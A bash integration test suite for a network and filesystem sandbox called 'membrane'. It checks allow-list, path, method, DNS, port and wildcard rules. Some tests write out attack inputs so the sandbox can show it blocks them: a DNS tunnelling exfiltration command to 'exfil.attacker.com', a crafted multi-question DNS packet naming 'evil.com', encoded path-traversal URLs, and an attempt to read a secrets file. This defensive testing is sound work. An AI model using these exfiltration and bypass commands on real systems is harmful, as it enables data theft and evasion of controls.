#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT=$(git rev-parse --show-toplevel)
MEMBRANE_CMD="$REPO_ROOT/membrane"

# Warm-up: build images and membrane binary once, so parallel test runs
# don't race on docker build.
"$REPO_ROOT/scripts/run-dev.sh" -- echo ok

# -------------------------------------------------------
# Helpers
# -------------------------------------------------------
dump_log() {
    local session_id="$1"
    [ -z "$session_id" ] && return
    local logpath="$HOME/.membrane/logs/membrane-handler-${session_id}.log"
    echo "--- handler log: $logpath ---"
    if [ -f "$logpath" ]; then
        cat "$logpath"
    elif [ -f "$logpath.gz" ]; then
        gunzip -c "$logpath.gz"
    else
        echo "(log file not found)"
    fi
    echo "--- end handler log ---"
}

run() {
    local desc="$1"
    local expected="$2"
    shift 2
    local idfile
    idfile=$(mktemp)
    local cmd
    cmd="${*// -- / --session-id-file=$idfile -- }"
    result=$(eval "$cmd" 2>/dev/null | tr -d '\r' | grep '< HTTP' | head -1 | sed 's/ *$//' || true)
    local session_id
    session_id=$(cat "$idfile" 2>/dev/null || true)
    rm -f "$idfile"
    if echo "$result" | grep -q "$expected"; then
        echo "PASS $desc ($result)"
    else
        echo "FAIL $desc — expected $expected, got: $result"
        dump_log "$session_id"
    fi
}

run_exit() {
    local desc="$1"
    local expected_exit="$2"
    shift 2
    local idfile
    idfile=$(mktemp)
    local cmd
    cmd="${*// -- / --session-id-file=$idfile -- }"
    actual_exit=0
    eval "$cmd" 2>/dev/null || actual_exit=$?
    local session_id
    session_id=$(cat "$idfile" 2>/dev/null || true)
    rm -f "$idfile"
    if [ "$actual_exit" -eq "$expected_exit" ]; then
        echo "PASS $desc (exit $actual_exit)"
    else
        echo "FAIL $desc — expected exit $expected_exit, got exit $actual_exit"
        dump_log "$session_id"
    fi
}

run_dns() {
    local desc="$1"
    local expected="$2"
    shift 2
    local idfile
    idfile=$(mktemp)
    result=$("$MEMBRANE_CMD" --no-trace --no-global-config --session-id-file="$idfile" -- bash -c "$*" 2>/dev/null | grep -o 'status: [A-Z]*' | head -1 || true)
    local session_id
    session_id=$(cat "$idfile" 2>/dev/null || true)
    rm -f "$idfile"
    if echo "$result" | grep -q "$expected"; then
        echo "PASS $desc ($result)"
    else
        echo "FAIL $desc — expected $expected, got: $result"
        dump_log "$session_id"
    fi
}

in_tmpdir() {
    local tmpdir
    tmpdir=$(mktemp -d)
    # shellcheck disable=SC2064  # intentional: expand $tmpdir now
    trap "rm -rf '$tmpdir'" EXIT
    cd "$tmpdir"
}

export MEMBRANE_CMD
export -f run run_exit run_dns in_tmpdir dump_log

# -------------------------------------------------------
# Test groups (each runs in its own temp dir)
# -------------------------------------------------------

group_1() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - httpbin.org
EOF
    run "1A plain hostname GET / passthrough" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/root 2>&1\""
    run "1B plain hostname POST / passthrough (origin decides)" "HTTP" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST https://httpbin.org/anything/root 2>&1\""
}

group_2() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org/anything/posts/
EOF
    run "2A bare URL entry GET /anything/posts/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "2B bare URL entry GET / blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
    run "2C bare URL entry POST /anything/posts/ allowed (no method constraint)" "HTTP" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST https://httpbin.org/anything/posts/ 2>&1\""
}

group_3() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
EOF
    run "3A method constraint GET / allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/root 2>&1\""
    run "3B method constraint POST / blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST https://httpbin.org/anything/root 2>&1\""
}

group_4() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
EOF
    run "4A method+url_path GET /anything/posts/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "4B method+url_path GET /anything/posts/on-the-money/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/on-the-money/ 2>&1\""
    run "4C method+url_path POST /anything/posts/ blocked (wrong method)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST https://httpbin.org/anything/posts/ 2>&1\""
    run "4D method+url_path GET / blocked (outside url_path)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
}

group_5() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
EOF
    run "5A absolute path GET /anything/posts/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "5B absolute path GET / blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
    run "5C absolute path POST /anything/posts/ blocked (wrong method)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST https://httpbin.org/anything/posts/ 2>&1\""
}

group_6() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
        paths:
          - on-the-money/
EOF
    run "6A relative path GET /anything/posts/on-the-money/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/on-the-money/ 2>&1\""
    run "6B relative path GET / blocked (outside dest path)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
}

group_7() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
      - methods: [GET]
        paths:
          - /anything/about
EOF
    run "7A multiple rules GET /anything/posts/ allowed (rule 1)" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "7B multiple rules GET /anything/about allowed (rule 2)" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/about 2>&1\""
    run "7C multiple rules GET / blocked (no rule matches)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
    run "7D multiple rules POST /anything/posts/ blocked (wrong method)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST https://httpbin.org/anything/posts/ 2>&1\""
}

group_8() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org/anything/posts/
  - dest: https://httpbin.org/anything/about
EOF
    run "8A multiple entries GET /anything/posts/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "8B multiple entries GET /anything/about allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/about 2>&1\""
    run "8C multiple entries GET / blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
}

group_9() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
EOF
    run_exit "9A host not in allow list fails" "6" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -sf -m 5 https://example.com\""
}

group_10() {
    in_tmpdir
    run "10A CLI bare URL GET /anything/posts/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config --allow=https://httpbin.org/anything/posts/ -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "10B CLI bare URL GET / blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config --allow=https://httpbin.org/anything/posts/ -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
    run "10C CLI plain hostname GET / passthrough" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config --allow=httpbin.org -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/root 2>&1\""
}

group_11() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - github.com
EOF
    run_dns "11A DNS allowed domain resolves" "NOERROR" \
        "dig github.com"
    run_dns "11B DNS blocked domain gets NXDOMAIN" "NXDOMAIN" \
        "dig google.com"
    run_dns "11C DNS tunneling attempt gets NXDOMAIN" "NXDOMAIN" \
        "dig \$(echo 'secret' | base64).exfil.attacker.com"
    run_exit "11D DNS direct resolver bypass blocked" "9" \
        "$MEMBRANE_CMD --no-trace --no-global-config --allow=github.com -- bash -c 'dig @8.8.8.8 github.com > /dev/null'"
}

group_12() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
EOF
    run "12A path boundary GET /anything/posts/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "12B path boundary GET /anything/posts/on-the-money/ allowed (subpath)" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/on-the-money/ 2>&1\""
    run "12C path boundary GET /anything/posts-evil blocked (no boundary)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts-evil 2>&1\""
}

group_13() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
EOF
    run "13A host-type http rules GET /anything/posts/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "13B host-type http rules GET / blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
    run "13C host-type http rules POST /anything/posts/ blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST https://httpbin.org/anything/posts/ 2>&1\""
}

group_14() {
    in_tmpdir
    mkdir -p secrets
    echo "api-key-value" >secrets/api-key.txt
    cat >.membrane.yaml <<'EOF'
ignore:
  - secrets/
EOF
    run_exit "14A trailing-slash ignore hides directory contents" "1" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'cat /workspace/secrets/api-key.txt'"

    cat >.membrane.yaml <<'EOF'
readonly:
  - secrets/
EOF
    run_exit "14B trailing-slash readonly makes directory read-only" "1" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'echo test > /workspace/secrets/api-key.txt'"

    mkdir -p config
    echo "safe-setting" >config/settings.yaml
    echo "secret-value" >config/secrets.txt
    cat >.membrane.yaml <<'EOF'
readonly:
  - config/
ignore:
  - config/secrets.txt
EOF
    run_exit "14C ignore nested inside readonly errors at startup" "1" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'echo should not run'"
}

group_15() {
    in_tmpdir
    # Resolve httpbin.org to an IP so we can test CIDR http rules
    IP=$(dig +short httpbin.org | head -1)
    cat >.membrane.yaml <<EOF
allow:
  - dest: ${IP}
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
EOF
    run "15A CIDR http rules GET /anything/posts/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 --resolve httpbin.org:443:${IP} https://httpbin.org/anything/posts/ 2>&1\""
    run "15B CIDR http rules GET / blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 --resolve 'httpbin.org:443:${IP}' https://httpbin.org/ 2>&1\""
    run "15C CIDR http rules POST /anything/posts/ blocked (wrong method)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST --resolve 'httpbin.org:443:${IP}' https://httpbin.org/anything/posts/ 2>&1\""
}

group_16() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - github.com
EOF
    result=$("$MEMBRANE_CMD" --no-trace --no-global-config -- bash -c '
python3 - <<PYEOF
import socket, struct, subprocess
gw = subprocess.check_output(["ip", "route"]).decode()
gw = [l for l in gw.splitlines() if "default" in l][0].split()[2]
def build_query(names):
    txid = 0x1234
    flags = 0x0100
    qdcount = len(names)
    header = struct.pack("!HHHHHH", txid, flags, qdcount, 0, 0, 0)
    questions = b""
    for name in names:
        for part in name.split("."):
            questions += bytes([len(part)]) + part.encode()
        questions += b"\x00"
        questions += struct.pack("!HH", 1, 1)
    return header + questions
pkt = build_query(["github.com", "evil.com"])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(pkt, (gw, 53))
resp, _ = s.recvfrom(512)
print("RCODE", resp[3] & 0x0F)
PYEOF
' 2>/dev/null | grep -o 'RCODE [0-9]*' || true)
    if echo "$result" | grep -q "RCODE 3"; then
        echo "PASS 16A multi-question DNS packet blocked (NXDOMAIN)"
    else
        echo "FAIL 16A multi-question DNS packet blocked — expected RCODE 3, got: $result"
    fi
}

group_17() {
    in_tmpdir
    # UDP blocked by default — plain IP in allow list, UDP should not pass
    cat >.membrane.yaml <<'EOF'
allow:
  - 8.8.8.8
EOF
    run_exit "17A UDP blocked by default to allowed IP" "9" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'dig @8.8.8.8 github.com > /dev/null'"

    # TCP still works to same IP (sanity check)
    run "17B TCP still works to allowed IP" "HTTP" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://8.8.8.8/ 2>&1\""

    # UDP opt-in works
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: 8.8.8.8
    ports: [53/udp]
EOF
    run_exit "17C UDP opt-in allows DNS" "0" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'dig @8.8.8.8 github.com > /dev/null'"
}

group_18() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
EOF
    # Dot-segment traversal — should be blocked (normalizes to /)
    run "18A dot-segment traversal blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 --path-as-is 'https://httpbin.org/anything/posts/../' 2>&1\""

    # Double dot-segment — should be blocked (normalizes to /)
    run "18B double dot-segment blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 --path-as-is 'https://httpbin.org/anything/posts/on-the-money/../../' 2>&1\""

    # Percent-encoded dot-segment — should be blocked
    run "18C percent-encoded traversal outside allowed path blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 --path-as-is 'https://httpbin.org/anything/posts/%2e%2e/' 2>&1\""

    # Double-encoded dot-segment — should be blocked
    run "18D double-encoded traversal outside allowed path blocked" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 --path-as-is 'https://httpbin.org/anything/posts/%252e%252e/' 2>&1\""

    # Normal path still works
    run "18E normal path still allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
}

group_19() {
    in_tmpdir

    # Host with http rules only — raw TCP should be blocked (no SSH banner)
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: github.com
    http:
      - methods: [GET]
        paths:
          - /
EOF
    run_exit "19A raw TCP blocked to host with http-only rules" "1" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'"

    # Plain hostname (no http rules) — raw TCP should be allowed (SSH banner present)
    cat >.membrane.yaml <<'EOF'
allow:
  - github.com
EOF
    run_exit "19B raw TCP allowed to plain hostname" "0" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'"

    # Host with http rules AND explicit tcp port — SSH should be allowed
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: github.com
    http:
      - methods: [GET]
        paths:
          - /
  - dest: github.com
    ports: [22/tcp]
EOF
    run_exit "19C raw TCP allowed on explicitly permitted port alongside http rules" "0" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'"
}

group_20() {
    in_tmpdir
    # URL entry with explicit http rules — port 443 enforced at L3,
    # method+path enforced at L7
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
        paths:
          - on-the-money/
EOF
    run "20A URL+http GET /anything/posts/on-the-money/ allowed" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/on-the-money/ 2>&1\""
    run "20B URL+http GET /anything/posts/ blocked (outside path constraint)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/posts/ 2>&1\""
    run "20C URL+http POST /anything/posts/on-the-money/ blocked (wrong method)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 -X POST https://httpbin.org/anything/posts/on-the-money/ 2>&1\""
    run "20D URL+http GET / blocked (outside url prefix)" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/ 2>&1\""
}

group_21() {
    in_tmpdir
    # CIDR entry with http rules — raw TCP blocked, HTTP enforced
    IP=$(dig +short github.com | head -1)
    cat >.membrane.yaml <<EOF
allow:
  - dest: ${IP}
    http:
      - methods: [GET]
        paths:
          - /
EOF
    run_exit "21A CIDR http-only rules block raw TCP" "1" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'sleep 3 | ncat -w3 ${IP} 22 2>&1 | grep -q SSH'"
    run "21B CIDR http rules still allow HTTP" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 --resolve github.com:443:${IP} https://github.com/ 2>&1\""
}

group_22() {
    in_tmpdir
    # Verify mitmproxy intercepts HTTPS on non-standard ports (port 8443 here)
    # based on byte-sniffing, not port number. Uses portquiz.takao-tech.com
    # because it's designed to serve HTTPS on any port.
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: portquiz.takao-tech.com
    http:
      - methods: [GET]
        paths:
          - /allowed/
EOF
    run "22A http rules enforced on non-standard port 8443" "403" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://portquiz.takao-tech.com:8443/ 2>&1\""
    run "22B http rules allow correct path on non-standard port 8443" "HTTP" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://portquiz.takao-tech.com:8443/allowed/ 2>&1\""
}

group_23() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - "*.httpbin.org"
EOF
    # httpbin.org apex does NOT match *.httpbin.org — should be blocked
    run_exit "23A host pattern *.httpbin.org blocks apex httpbin.org" "6" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -sf -m 5 https://httpbin.org/ 2>&1\""

    # Subdomain (eu.httpbin.org, if it exists) would match.
    # Instead pick a domain we know has subdomains: github.com has api.github.com
    cat >.membrane.yaml <<'EOF'
allow:
  - "*.github.com"
EOF
    run "23B host pattern *.github.com allows api.github.com" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://api.github.com/ 2>&1\""
    run_exit "23C host pattern *.github.com blocks apex github.com" "6" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -sf -m 5 https://github.com/ 2>&1\""
}

group_24() {
    in_tmpdir
    cat >.membrane.yaml <<'EOF'
allow:
  - "*"
EOF
    # Any host, any TCP port should work
    run "24A bare * allows arbitrary host" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/root 2>&1\""
    run "24B bare * allows another arbitrary host" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://api.github.com/ 2>&1\""

    # Constrained to specific port — TCP to 22 should be blocked, TCP to 443 works
    cat >.membrane.yaml <<'EOF'
allow:
  - dest: "*"
    ports: [443/tcp]
EOF
    run_exit "24C bare * with ports:[443/tcp] blocks SSH port 22" "1" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'"
    run "24D bare * with ports:[443/tcp] allows HTTPS" "200" \
        "$MEMBRANE_CMD --no-trace --no-global-config -- bash -c \"curl -svL -m 5 https://httpbin.org/anything/root 2>&1\""
}

export -f group_1 group_2 group_3 group_4 group_5 group_6 group_7 group_8 \
    group_9 group_10 group_11 group_12 group_13 group_14 group_15 group_16 group_17 \
    group_18 group_19 group_20 group_21 group_22 group_23 group_24

# -------------------------------------------------------
# Run specified groups, or all if none given
# -------------------------------------------------------
if [ $# -eq 0 ]; then
    groups=(group_1 group_2 group_3 group_4 group_5 group_6 group_7 group_8
        group_9 group_10 group_11 group_12 group_13 group_14 group_15 group_16
        group_17 group_18 group_19 group_20 group_21 group_22 group_23
        group_24)
else
    groups=()
    for n in "$@"; do
        groups+=("group_$n")
    done
fi

parallel --group ::: "${groups[@]}"

echo "done"
